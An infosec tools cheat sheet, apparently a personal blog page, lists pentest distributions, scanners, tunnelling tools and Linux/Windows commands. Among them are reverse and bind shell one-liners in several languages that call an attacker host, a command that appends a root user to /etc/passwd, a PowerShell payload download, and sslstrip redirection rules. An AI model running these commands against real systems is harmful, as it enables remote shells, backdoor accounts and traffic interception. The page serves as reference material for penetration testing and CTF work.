---
layout: page

title: _tools_

category: infosec
see_my_category_in_header: true

permalink: /infosec/tools.html
---

<article class="markdown-body" markdown="1">

# Content

* TOC
{:toc}

---

# Other collections

## Pentest linux distributions

[Distro Tools List](http://www.kitploit.com/search/label/Distro#) - list of security linux destirbutives

* [kali linux](https://www.kali.org/) (+ exists kali for android - *NetHunter*) - penetration testing and ethical hacking linux distribution
* Other pentest distros:

    * [BlackArch](https://blackarch.org/tools.html) - kali-linux main competitor
    * [Backbox](https://backbox.org/)
    * [Parrot Security OS](https://www.parrotsec.org/download.fx)
    * [Cyborg](http://cyborg.ztrela.com/)
    * [Devuan](https://devuan.org/)
    * [Live Wifislax](http://www.wifislax.com/) - wifi security
    * [Android Tamer](https://androidtamer.com/) - android security

* [pentestbox](https://pentestbox.org/#download) - collection of hacking tools for windows

*Caution!* - hackers hack other hackers - divide your personal accounts/environment and your working pentest env. <br>
*Caution!* - Kali linux, etc. has a lots of built-in tools, which is not really thoroughly checked for vulnerabilities, therefore all hacking destributions is highly dangerous.

<br>

## Other pentest lists

* [en.kali.tools](https://en.kali.tools/all/) - all kali tools
* [blackarch.org/tools.html](https://blackarch.org/tools.html) - all blackarch tools
* [securityxploded](http://securityxploded.com/) - contains lists of handy tools for linux/windows/recovery/network/anti-spyware/security
* [sectools.org](http://sectools.org/) - top 125 network security tools
* [lcamtuf.coredump.cx](http://lcamtuf.coredump.cx/)

<!-- !!! All this repos IN NEXT BLOCK must be examined for utils and be mastered -->

* [jivoi/pentest](https://github.com/jivoi/pentest) - awesome repo with pentest utils and pentest notes
    <!-- !!! Directory [notes](https://github.com/jivoi/pentest/tree/master/notes) must be specially examined -->
* [Powerful Plugins](https://github.com/Hack-with-Github/Powerful-Plugins) - list of plugins for burp, firefox, IDA, Immunity Dbg, OSINT, OllyDbg, ThreatIntel, volatility
* [Влад Росков (Kaspersky)](https://vk.com/topic-114366489_33962987) (russian) - collection of tools for web, crypto, stegano, forensic, reverse, network, recon
* [penetration testing tools cheat sheet (highon.cofee)](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)
* [malware-analyzer](http://www.malware-analyzer.com/analysis-tools)
* repos with ideology "have every script that a hacker needs"

    * [x3omdax/PenBox](https://github.com/x3omdax/PenBox)
    * [Manisso/fsociety](https://github.com/Manisso/fsociety)

* {:.dummy} [pentestmonkey's misc](http://pentestmonkey.net/category/tools/misc)

<br>

* [skullsecurity.org](https://wiki.skullsecurity.org/index.php?title=Hacking) - list of commands for various OS'es
* [commandlinefu.com](https://www.commandlinefu.com/commands/browse/sort-by-votes) - list of console's cheats

<br>

* [McAffee tools](https://www.mcafee.com/us/downloads/free-tools/index.aspx)
* [(RU) Cisco tools](https://habrahabr.ru/company/cisco/blog/346160/)

CTF orientation:

* [eugenekolo/sec-tools](https://github.com/eugenekolo/sec-tools)
* [apsdehal/awesome-ctf](https://github.com/apsdehal/awesome-ctf)
* [zardus'es ctf-tools](https://github.com/zardus/ctf-tools)
* [Useful tools for CTF](http://delimitry.blogspot.ca/2014/10/useful-tools-for-ctf.html?m=1)
* [Tools and Resources to Prepare for a Hacker CTF Competition or Challenge (resources.infosecinstitute.com)](http://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/)
* [CTF & PenTest Tools (gdocs)](https://docs.google.com/document/d/146caSNu-v9RtU9g2l-WhHGxXV4MD02lm0kiYs2wOmn0/mobilebasic?pli=1)
* [ItSecWiki (RU)](http://itsecwiki.org/index.php) (russian) - wiki-шпаргалка для использования во время CTF соревнований

<br>

## Tools for android

* [NetHunter](https://www.kali.org/kali-linux-nethunter/) - Kali-linux for Android
* [SuperSU](https://play.google.com/store/apps/details?id=eu.chainfire.supersu)
* [Hijacker](https://github.com/chrisk44/Hijacker/releases) - GUI for wifi pentest tools: Aircrack-ng, Airodump-ng, MDK3 and Reaver (requirements: suitable wifi-chipset and rooted device) ([article](https://www.kitploit.com/2017/09/hijacker-v13-all-in-one-wi-fi-cracking.html) about Hijacker)
* [WiFiAnalyzer](https://play.google.com/store/apps/details?id=com.vrem.wifianalyzer)

<br>

---

# Command-line linux/windows cheats

* [Execute a `system` command](https://rosettacode.org/wiki/Execute_a_system_command#Python) in a lot of various languages.

#### run shells listening on network (with different languages)

*thanks to [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))*

* ***netcat*** bind shell: remote: `nc -e /bin/bash -nvlp 12344`, local: `nc -nvv 10.0.0.1 12344`
* ***netcat*** reverse shell: remote: `nc -e /bin/bash 10.0.0.1 1337`, local: `nc -nvlp 12344`
* ***bash***: remote: `bash -i >& /dev/tcp/10.0.0.1/12344 0>&1`, local: `nc -nvlp 12344`
* ***perl***: remote: `perl -e 'use Socket;$i="10.0.0.1";$p=12344;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, local: `nc -nvlp 12344`
* ***python***: remote: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",12344));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, local: `nc -nvlp 12344`
* ***php***: remote: `php -r '$sock=fsockopen("10.0.0.1",12344);exec("/bin/sh -i <&3 >&3 2>&3");'`, local: `nc -nvlp 12344`
* ***ruby***: remote: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",12344).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, local: `nc -nvlp 12344`
* ***java***: remote: `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/12344;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();`, local: `nc -nvlp 12344`
* ***xterm***: remote: `xterm -display 10.0.0.1:1` (this will connect on port 6001), local: `Xnest :1` (target must be authorized to connect to you: `xhost +targetip`)

<br>

## Linux commands / steroids

* [commandlinefu.com](http://www.commandlinefu.com/commands/browse/sort-by-votes) - a ton of fun and useful command-line commands
* [explainshell.com](https://explainshell.com/explain?cmd=ssh+-L+127.0.0.1%3A2222%3A192.168.1.3%3A2345+root%40192.168.1.2) - web-site with beautifull linux's MAN integration

<br>

* ***grep*** - `grep ./ -r -A 3 -B 3 -aniPe "search-string"` - also print neighbour lines
    <br> `grep ./ -r -aoiPe "search-string"` - `-o` look up binary files too
    <br> `-i` - ignore case

* ***find*** - `find / -type d -name "*jdk*" -print` (search for directory)
    <br> `find / -perm /6000 -user root -exec ls -ldb {} \;` - search files, owned by root with suid OR guid bit and pass files to `ls`
    <br> find is *incredibly* powerfull (can filter by time, permissions, users, regexp path, depth, ...)

* ***netcat*** - `nc -e /bin/bash -w 3 -nvlp 12344` + `nc localhost 12344` - shell through modern netcat
    <br> `rm /tmp/q;mkfifo /tmp/q;cat /tmp/q|/bin/sh -i 2>&1|nc -l -p 12344 >/tmp/q` + `nc localhost 12344` - shell through netcat
    <br> `nc -zv example.com 1-1000` - scan ports

* *Patching shell after exploit*: `python -c 'import pty; pty.spawn("/bin/bash")'` (this makes your shell normal (after some exploits you will have only miserable os-commanding)), in other words: "an upgrade from a regular semi-interactive shell"

* ***Add user***, by adding it into ***`/etc/passwd`***:
    <br> `openssl passwd -1` -> `$1$P31HlF1S$uIgLxnmiwjuC2.iaP8xvJ/` (password: test) ([more](https://ma.ttias.be/how-to-generate-a-passwd-password-hash-via-the-command-line-on-linux/) and [more](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow), ...) (generation with salt: `openssl passwd -1 -salt my_salt my_pass`)
    <br> `echo "username:$1$P31HlF1S$uIgLxnmiwjuC2.iaP8xvJ/:0:0:comment:/root:/bin/bash" >>/etc/passwd`

* ***proxychains*** - `echo "socks4 127.0.0.1 8080" >>/etc/proxychains.conf` `proxychains firefox`
    <br> alternative: ***tsocks*** - `/etc/tsocks.conf`
* ***iptables*** list rules: `iptables -L -v -n --line-numbers # show all rules` (`-t` tables: nat, filter, mangle, raw, security) ([man iptables (ru)](https://www.opennet.ru/docs/RUS/iptables/#TRAVERSINGGENERAL) - великолепная статья про iptables)
* ***openssl***

    * connect: `openssl s_client -connect ya.ru:443`
    * view certificate: `openssl pkcs12 -info -in cert.p12`

<br>

**Simple linux commands**:

* `python -m SimpleHTTPServer <port>` - host current directory (simple web-server)
* `echo "test" | at midnight` - run command at specified time
* `man ascii`
* `Alt + F1 F2 ...` – changes terminals in *linux* console (`F7` - is *usually* System X)
* **network**:

    * `curl ifconfig.me` - get your public ip-address
    * `route -nee`, `netstat -rn`, `ip route list` - see linux routes
    * `netstat -tulpan` - see current connections
    * `nc -nvlp 12344`
    * `fping` - ping multiple hosts simultaneously
    * `ip addr add 10.0.0.3/24 dev eth0`

* **formatting**:

    * `mount | column -t` - column command gives good formatting
    * `… | less` - helps to view long files/output on not-scrolling terminal
    * `cat apache.log | tail -f`

* **system management**:

    * `df -hT`, `du -hd 1`, `fdisk -l`, `free -h`
    * ***ulimit*** - get and set user limits in linux
    * ***netstat***, ***htop***, ***top***, ***dstat***, ***free***, ***vmstat***, ***ncdu***, ***iftop***, ***hethogs***
    * ***lsblk***, ***lscpu***, ***lshw***, ***lsus***, ***lspci***, ***lsusb***
    * **lsof** - list opened files - very flexible utility, can be used for network analylsis
    * [SEToolkit (v3.5.1 - 2013)](https://sourceforge.net/projects/setoolkit/) - a collection of scripts for performance analysis and gives advice on performance improvement (it has been a standard in system performance monitoring for the Solaris platform over the last 10 years)

* **file manipulation**:

    * ***vbindiff*** - hexadecimal file display and comparison
    * ***iconv/uconv*** – convert between encodings
    * ***dos2unix*** (any combination of `dos`, `unix`, `mac`) – DOS/Mac to Unix and vice versa text file format converter

<br>

* **Bash(zsh)-playing**

    * `reset` - restore your terminal to default state after breaking it with binary/raw data
    * `Ctrl+u` - save currently gathered command, `Ctrl+y` - restore previously saved command
    * `Ctrl+x Ctrl+e` - runs vim to create complex command for future execution
    * `sudo !!` - rerun previous command with sudo (or any other command)
    * `^foo^bar` - run previous command with replacement
    * ` command` - command starting with *space* will be executed, but not stored in history
    * `(cd /tmp && ls)` - execute command and custom directory, and return to previous directory

<br>

#### My personal cheatsheet

* **Linux STEROIDS**

    * ***zsh*** + [robbyrussell/oh-my-zsh](https://github.com/robbyrussell/oh-my-zsh) + [zdharma/history-search-multi-word](https://github.com/zdharma/history-search-multi-word)
    * ***tmux*** ([tmux shortcuts & cheatsheet](https://gist.github.com/MohamedAlaa/2961058)) + [gpakosz/.tmux](https://github.com/gpakosz/.tmux)
    * ***vim*** + [amix/vimrc](https://github.com/amix/vimrc) + (matter of taste: [tombh/novim-mode](https://github.com/tombh/novim-mode) + [reedes/vim-pencil](https://github.com/reedes/vim-pencil))
    * ***bash*** + [fnichol/bashrc](https://github.com/fnichol/bashrc)
    * ***nano*** + [scopatz/nanorc](https://github.com/scopatz/nanorc)

* `mount -t btrfs /dev/sdb2 -o rw /media/ctf-dumps` (`apt-get instal btrfs-tools`)
* `rdesktop 10.0.0.1 -u "phonexicum" -p "MyPass" -r disk:share=/home/phonexicum/Desktop/share -r clipboard:PRIMARYCLIPBOARD -g 1333x768`
* `cp /usr/share/applications/guake.desktop /etc/xdg/autostart/` - linux autostart guake
* Connect to wifi

    <div class="spoiler"><div class="spoiler-title" markdown="1">
    *wpa_supplicant/auto/manual*
    </div><div class="spoiler-text" markdown="1">

    *   *wpa_supplicant*:

        ```
        sudo wpa_supplicant -Dnl80211 -iwlan0 -C/var/run -dd
        sudo wpa_cli -p/var/run
        > scan
        > scan_results
        > add_network
        > set_network 0 ssid "vodafone817E"
        > set_network 0 psk "my-pass-phrase"
        > enable_network 0
        > reconnect
        > status
        > quit
        sudo dhclient wlan0
        ```

    *   Auto: add to `/etc/network/interfaces`:

        ```
        auto wlan0
        iface wlan0 inet dhcp
            wpa-ssid MyHomeWifi
            wpa-psk MySecretPassword
        ```

    *   Manual:

        ``` bash
        sudo ifconfig wlan0 up
        sudo iwlist wlan0 scan
        sudo iwconfig wlan0 essid MyHomeWifi key s:MySecretPassword
        sudo dhclient wlan0
        ```

    </div>
    </div>

* `wget -mk http://www.example.com/` - can be used for site mirroring
* regexp [using Look-ahead and Look-behind](http://www.perlmonks.org/?node_id=518444)

**Manage linux user/login/...** :

* `chsh -s /bin/zsh phonexicum`
* `useradd phonexicum -m -s '/bin/bash' -G sudo,pentest_group` - add new user
* `usermod -a -G phonexicum hacker_group` - add user to group
* `groups username` - get user's groups

**Fun linux commands**:

* `wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com` - download whole web-site (light website crawler)
* `find / -type f -xdev -printf '%s %p\n' | sort -n | tail -20` - search 20 most big files in fs
* `du -xS / | sort -n | tail -20` - search 20 most big directories in fs
* `dd if=/dev/dsp | ssh -c arcfour -C phonexicum@10.0.0.2 dd of=/dev/dsp` - move audio from your machine to remote <br>
    or `arecord -f dat | ssh -C phonexicum@10.0.0.2 aplay -f dat`

* `curl -u phonexicum:MyPassword -d status="Tweeting from the shell" https://twitter.com/statuses/update.xml` - making a tweet from console

Other tools:

* ***pgpdump*** – a PGP packet visualizer
* [sysdig](https://www.sysdig.org/) – system-level exploration: capture system state and activity from a running Linux instance, then save, filter and analyze (looks like rootkit)

<br>


## Windows commands / steroids

* [hiew](http://www.hiew.ru/) - view and edit files of any length in text, hex, and decode modes, ...
    <br> [radare2](https://github.com/radare/radare2) - is a very good alternative (probably even better) - some people say: radare must not be treated as disassembler, but as featured hex-editor
* **Monitor system / executables / processes / ...**

    * [SysInternals Suite](https://technet.microsoft.com/ru-ru/sysinternals/bb842062) - [docs](https://technet.microsoft.com/ru-ru/sysinternals/bb842062) – sysinternals troubleshooting utilities
    * [x64tools](http://www.nirsoft.net/x64_download_package.html) - [docs](http://www.nirsoft.net/x64_download_package.html) – small collection of utils for x64 windows
    * [Process Hacker](http://processhacker.sourceforge.net/) - helps to monitor system resources, debug software and detect malware
    * [NirSoft](http://www.nirsoft.net/) - contains lots of utilities for windows monitoring and forensics
    * [api-monitor-v2r13-x86-x64](http://www.rohitab.com/apimonitor) – lets you monitor and control API calls made by applications and services

* **repair/restore**

    * [MSDaRT](http://usbtor.ru/viewtopic.php?t=126) - microsoft diagnostic and recovery toolset
    * [Hiren's Boot CD](http://www.hirensbootcd.org/download/) (9 Nov 2012)

<br>

* `powershell -nop -c "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.108/r.exe', 'C:\Users\Bethany\Links\r.exe')"` - netcat analogue
* [FakeNet](https://sourceforge.net/projects/fakenet/) - windows network simulation tool. It redirects all traffic leaving a machine to the localhost
* ***powershell*** (`get-method`, `get-help`). Steroids:
    
    * [PowerTab](https://powertab.codeplex.com/) - extension of the PowerShell tab expansion feature
    * [PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal) - module can be used to disassemble managed and unmanaged code, perform .NET malware analysis, analyze/scrape memory, parse file formats and memory structures, obtain internal system information, etc

* ***ClipboardView*** (win)
* ***putty*** – ssh client

<br>

## Tunneling/pivoting

[A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/#dns-with-proxychains) - very good article on pivoting

* ***ICMP*** tunnel

    * [hans](http://code.gerade.org/hans/) (creates tun device + exists for windows)
    *   [ptunnel](http://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/) - tunneling TCP into ICMP

        ``` bash
        # Server:
        sudo ptunnel -x PASSWORD

        # Client:
        sudo ptunnel -p server.white.ip-addr.com -lp 80 -da myip.ru -dp 80 -x PASSWORD

        # Client, set up with proxychains
        sudo ptunnel -p server.white.ip-addr.com -lp 12344 -da your.ssh.server.com -dp 22 -x PASSWORD
        sudo ssh -f -N -D 12345 phonexicum@localhost -p 12344
        sudo bash -c "echo 'socks4 127.0.0.1 12345' >>/etc/proxychains.conf"
        proxychains firefox &
        ```

    * [udp2raw](https://github.com/wangyu-/udp2raw-tunnel) - tunnelling UDP in ***TCP/ICMP***
    * [icmptunnel](https://github.com/DhavalKapil/icmptunnel) - creates tap device (does not exist for windows)

* ***DNS*** tunnel [iodine](http://code.kryo.se/iodine/) ([dnscat2](https://github.com/iagox86/dnscat2), [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) - designed for "command and control" ([usage example (RU)](https://defcon.ru/network-security/956/)))
* ***SSH tunnel*** [VPN туннель средствами ssh](http://linuxoid.in/VPN-%D1%82%D1%83%D0%BD%D0%BD%D0%B5%D0%BB%D1%8C_%D1%81%D1%80%D0%B5%D0%B4%D1%81%D1%82%D0%B2%D0%B0%D0%BC%D0%B8_ssh) [VPN over OpenSSH](https://wiki.archlinux.org/index.php/VPN_over_SSH) (or (RU)[VPN через SSH](https://vds-admin.ru/unix-toolbox/vpn-over-ssh)) (`PermitTunnel yes` required)

* ***SSH*** port forwarding (pivoting) (`AllowTcpForwarding yes` and `GatewayPorts yes` required (default behaviour))

    * Local port forwarding: `ssh -L 12344:remote.com:80 phonexicum@192.168.x.y` - connection to localhost:9000 will be forwarded to remote.com:80 (`ssh -L 0.0.0.0:12344:remote.com:80 phonexicum@192.168.x.y`)
        <br> `~/.ssh/config`: `LocalForward 127.0.0.1:12344 remote.com:80`
    * Remote port forwarding: `ssh -R 12344:remote.com:80 phonexicum@192.168.x.y` - connection on 192.168.x.y:12344 will be forwarded to localhost:80 (`ssh -R 0.0.0.0:12344:remote.com:80 phonexicum@192.168.x.y`)
        <br> `~/.ssh/config`: `RemoteForward 127.0.0.1:12344 remote.com:80`
    * Dynamic port forwarding (linux as *SOCKS* proxy): `ssh -f -N -D 8080 phonexicum@192.168.x.y` (`-N` - *not* run commands on server) (`ssh -f -N -D 0.0.0.0:8080 phonexicum@192.168.x.y`)
        <br> `echo "socks4 127.0.0.1 8080" > /etc/proxychains.conf` `sh> proxychains AnyApplication`
        <br> `~/.ssh/config`: `DynamicForward 127.0.0.1:8080`
   * VPN over SSH - this is possible!, but a bit more complicated (I just did not yet tried it) 
    
    For better stability add to `ssh_config`: `TCPKeepAlive yes`, `ServerAliveInterval 300`, `ServerAliveCountMax 3`

* ***SSH*** commanding:

    * `Enter` + `~` + `?` - help
    * `Enter` + `~` + `#` - list of all forwarded connections
    * `Enter` + `~` + `C` - internal ssh shell for add/remove forwarding
    * `Enter` + `~` + `.` - terminate current ssh session

    ***SSH*** gui forwarding: `ssh -X phonexicum@192.168.x.y` (`-Y` - less secure, but faster) (`X11Forwarding yes` required)

    Skip certificate check: `ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no phonexicum@192.168.x.y`

<br>

---

# Offensive

## Security scanners

*There is much-much more scanners exists in the world (good and ...)*

* Vulnerability scanners:

    * [Nessus (tenable)](https://www.tenable.com/products/nessus-vulnerability-scanner) (*Nessus Home - scan 16 IPs for 1 week*)
    * [Qualys FreeScan](https://www.qualys.com/forms/freescan/) (*FREE???*)
    * [OpenVAS](http://www.openvas.org/) (*FREE*) (scanner is not really good, because it is opensource), however lots of other scanners started using its engine
    * [MaxPatrol](https://www.ptsecurity.com/ru-ru/products/mp8/) - price is incredible (because this is not just a scanner, but a huge framework)
    * [nexpose](https://www.rapid7.com/products/nexpose/)
    * [Sn1per (github)](https://github.com/1N3/Sn1per) (*FREE*) - an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities

* Web scanners:

    *article*: [evaluation of web vulnerability scanners](https://www.netsparker.com/blog/web-security/how-to-evaluate-web-application-security-scanners-tools/)

    * [Acunetix](https://www.acunetix.com/free-network-vulnerability-scanner/)
    * [Nikto2](https://cirt.net/Nikto2) web-server scanner ([nikto (github)](https://github.com/sullo/nikto)) (*FREE* scanner)
    * [BurpSuite](https://portswigger.net/burp) - very good web-proxy with some scanning capabilities in PRO version (*FREE* + PRO). Good extensions:

        * [HUNT](https://github.com/bugcrowd/HUNT)

    * [retire.js](https://retirejs.github.io/retire.js/) (exists as commandline, chrome/firefox/burp/owasp-zap extensions) - check for the components (on web-site) with known vulnerabilities (vulnerability scanner)
    * [v3n0m-Scanner/V3n0M-Scanner](https://github.com/v3n0m-Scanner/V3n0M-Scanner) - popular pentesting scanner in Python3.6 for SQLi/XSS/LFI/RFI and other vulns
    * [w3af](http://w3af.org/) - web-application attack and audit framework
    * ***Dirbuster***, ***dirsearch***, ... (*FREE*)
    * [IBM security AppScan](https://www.ibm.com/security/application-security/appscan)
    
    <div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
    <i>some more</i>
    </div><div class="spoiler-text" markdown="1">
    * {:.dummy} [Wapiti](http://wapiti.sourceforge.net/) - the web-application vulnerability scanner (not really maintained now)
    * {:.dummy} [ratproxy](https://code.google.com/archive/p/ratproxy/) - a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments. Detects and prioritizes broad classes of security problems, such as dynamic cross-site trust model considerations, script inclusion issues, content serving problems, insufficient XSRF and XSS defenses, and much more.
    * {:.dummy} [Paros](http://sectools.org/tool/paros/) - proxy for assessing web-applications (last release - 2006)
    * {:.dummy} [skipfish](https://code.google.com/archive/p/skipfish/) - an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks (in short: web-application security scanner)
    </div>
    </div>

    <br>

    CMS scanners:
    
    * [CMSmap](https://github.com/Dionach/CMSmap) - open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs
    * [wpscan](https://github.com/wpscanteam/wpscan) - WordPress scanner
    * [DrupalScan](https://github.com/rverton/DrupalScan) - Drupal scanner
    * [joomscan](https://github.com/rezasp/joomscan) - Joomla scanner
    * [google's Cloud Security Scanner](https://cloud.google.com/security-scanner/) - automatically scans App Engine apps for common vulnerabilities

* ERP (Enterprise Resource Planning) scanners:

    * [Onapsis](https://www.onapsis.com/)
    * [ERPScan](https://erpscan.com/products/erpscan-security-scanner-for-sap/)

* NetBios (smb, ...) scanners:

    * [enum4linux](https://github.com/portcullislabs/enum4linux) - enumerating data from Windows and Samba hosts
    * [LanScope](https://lizardsystems.com/network-scanner/) (*FREE* for personal use)
    * [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) (*FREE*)

* Other scanners:

    * **LDAP**: [BloodHound (github)](https://github.com/BloodHoundAD/BloodHound) - analyze ldap relationships and handy result's view (*FREE*)
    * **NetBIOS** [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) - scans for open NETBIOS nameservers
    * **SMTP**: [***smtp-user-enum***](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum), ***ismtp*** (kali-tools) - smtp user enumiration and testing tool
        <br> `smtp-user-enum -M VRFY -U usernames.txt -t 10.0.0.2`
    * **SNMP**: ***braa*** (mass snmp scanner), **onesixtyone**, ***snmpwalk***, ***snmp-check*** (kali-tools)
    * **VPN**: [The IKE scanner](https://github.com/royhills/ike-scan) - discover and fingerprint IKE hosts (IPsec VPN Servers)
    * **tftp**: `nmap -n -sU -p69 --script tftp-enum 10.0.0.2` (nmap uses dictionary: `/usr/share/nmap/nselib/data/tftplist.txt`) - bruteforce filenames in tftp
    * Solaris's (maybe unix-compatible) services: **ftp** (port 21): [ftp-user-enum](http://pentestmonkey.net/tools/user-enumeration/ftp-user-enum), **ident** (port 113): [ident-user-enum](http://pentestmonkey.net/tools/user-enumeration/ident-user-enum), **finger** (port 79): [finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

<br>

---

## Collaboration systems

[Системы обработки данных при проведении тестирования на проникновение (RU)](https://habrahabr.ru/company/pentestit/blog/283056/)

* [lair framework](https://github.com/lair-framework/lair) - looks really good with all core features, the project is not really mature, and there is some drawbacks, however they are not significant. The bad is: project does not look like been maintained now ([introducing lair](https://www.youtube.com/watch?v=71Hix58keCU))
* [FaradaySEC](https://www.faradaysec.com/) ([faraday (github)](https://github.com/infobyte/faraday)) - not really user-friendly, some core features is not supported, talking to developers are useless, their answers looks like evil mockery, anyway this looks like the most mature solution on the market today (faraday can import lots of varous tool's reports)
* [Dradis](https://dradisframework.com/) (installed by default at kali linux)
* [Serpico](https://github.com/SerpicoProject/Serpico)

Google-docs analogue:

* [onlyoffice](https://www.onlyoffice.com/) - looks almost like google-docs, but with storing information at your own server (better install it from docker hub)
    <br> (comparing to google has only one single drawback: there is no feature of TOC (Table of contence) autoconstruction and handy TOC navigation)
* [etherpad](http://etherpad.org/) - lightweight, like online notepad for your team, handy 'color' feature

<br>

* [Code Dx](https://codedx.com/) - collaboration tool for vulnerabilities, targeted at analysation with source codes. Not for pentersters, but very good for infosec specialists at company, who analyze their own software and deliver vulnerability findings to developer using integration with JIRA.
* [Checkmarx](https://www.checkmarx.com/) - code analysis with ability to be intergrated into SDLC.

<br>

* [KeepNote](http://keepnote.org/) - crossplatform and handy to save your own notes (single user by design)
    <br> can save screenshots, plugins can import data from nmap's XML format, ...

<br>

---

## Network

Well known ports: [Ports info (speedguide)](http://www.speedguide.net/ports.php), [wikipedia](http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)

<div class="spoiler"><div class="spoiler-title">
<i>ip netmasks cheatsheet</i>
</div><div class="spoiler-text" markdown="1">
![]({{ "/resources/netmasks.png" | prepend: site.baseurl }}){:width="1000px"}
</div></div>

Hosts which resolves into `127.0.0.1`: `localtest.me`, `*.vcap.me`, `m.mts.ru`
<br> `69.254.169.254` <- `cloud.localdomain.pw`

### Network scanners

* **arp-protocol scan** (discover hosts):

    arp scanning will discover not only hosts in current network, but also other machine's interfaces which belongs to other's networks, because most OS will answer to arp request on all their interfaces

    *   [arp-scan](https://github.com/royhills/arp-scan) - scan existing hosts using arp-scan

        ``` bash
        arp-scan -l -I eth0
        arp-scan --interface=eth0 192.168.0.0/24 | grep 192.168.0.2
        arp-scan --localnet
        ```
        
        <!-- `sudo arp-scan -l -I eth0 | grep "VMware" | awk '{print $1}' | xargs sudo nmap -sV` -->

    * [netdiscover](https://github.com/alexxy/netdiscover) - discover hosts using arp-requests

*   **port scan**:

    *   [nmap](https://nmap.org/) - utility for network discovery and security auditing. [zenmap](https://nmap.org/zenmap/) - nmap with GUI

        {% include_relative /fragments/nmap-cheatsheet.md %}

    * [zmap](https://github.com/zmap/zmap) - utility to multithreaded scan of internet's fixed port. <br>
        [ZMap Project (zmap.io)](https://zmap.io/) - a lot of tools for internet manipulating/scanning (the ZMap Project is a collection of open source tools that enable researchers to perform large-scale studies of the hosts and services that compose the public Internet)
        <small>(ZMap, ZGrab, ZDNS, ZTag, ZBrowse, ZCrypto, ZLint, ZIterate, ZBlacklist, ZSchema, ZCertificate, ZTee)</small>

    * [masscan](https://github.com/robertdavidgraham/masscan) - TCP port scanner, spews SYN packets asynchronously, scanning entire Internet in under 5 minutes.
    * [unicorn](http://sectools.org/tool/unicornscan/) ([kalilinuxtutorials.com](http://kalilinuxtutorials.com/unicornscan/)) - yet another utility for port-scanning (also looks multithreaded)
    
    <div class="spoiler"><div class="spoiler-title" markdown="1">
    *for those, whose religion does not allow to use **nmap***
    </div><div class="spoiler-text" markdown="1">

    * [Angry IP Scanner](http://angryip.org/)
    * [SuperScan](https://www.mcafee.com/ru/downloads/free-tools/superscan.aspx)
    * [SoftPerfect NetScan](https://www.softperfect.com/products/networkscanner/)
    * [ipscan23](http://api.256file.com/ipscan23.exe/en-download-132565.html)
    </div></div>

*   **arbitrary scan**:

    ***hping3*** is a very powerfull tool for sending almost arbitrary tcp/ip packets

    *   using IPID amount of servers beside balancer can be found (e.g. `hping3 -c 10 -i 1 -p 80 -S beta.search.microsoft.com.`: )
        <br> `46 bytes from 207.46.197.115: flags=RA seq=4 ttl=56 id=18588 win=0 rtt=21.2 ms`
        <br> `46 bytes from 207.46.197.115: flags=SA seq=5 ttl=56 id=57741 win=16616 rtt=21.2 ms`
    *   detect firewall rules (by sending various packets and monitoring IPID changes)
    *   detect host's OS (different os generates IPID differently) (nmap does this)

### network sniffing

* [wireshark](https://www.wireshark.org/) - traffic capture and analysis
* ***tcpdump*** - traffic sniffer
* [NetworkMiner](http://www.netresec.com/?page=NetworkMiner) (windows) – network forensic analysis tool (NFAT)
* ***hcidump*** - reads raw HCI data coming from and going to a Bluetooth device
* {:.dummy} [netool](https://sourceforge.net/p/netoolsh/wiki/netool.sh%20script%20project/) – automate frameworks like Nmap, Driftnet, Sslstrip, Metasploit and Ettercap MitM attacks

<br>

* [PacketTotal](https://www.packettotal.com/) - pcap analysis engine + show most popular uploaded pcap's (usually with some malware)

### attacking network/routers

* **hping3** – send (almost) ***arbitrary*** TCP/IP packets to network hosts (can be user for DoS purpose)
* [***routersploit***](https://github.com/reverse-shell/routersploit) - router exploitation framework
* *MITM - Man-in-the-middle*

    * **arpspoof**
    * **sslstrip** - http->https redirection interception

        * using *arpspoof*
        * `echo 1 > /proc/sys/net/ipv4/ip_forward` - for packet transition
        * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT –to-port 1717` - for packets redirection on ssl-stip listening port

    * **sslsplit** - transparent SSL/TLS interception
    * [bettercap](https://www.bettercap.org/docs/intro.html) - powerful tool created to perform various types of MITM attacks against a network
        <br> ([ssl stripping and hsts bypass](https://www.bettercap.org/blog/sslstripping-and-hsts-bypass/)), ([Инструкция по использованию Bettercap (RU)](https://hackware.ru/?p=1100)), ...
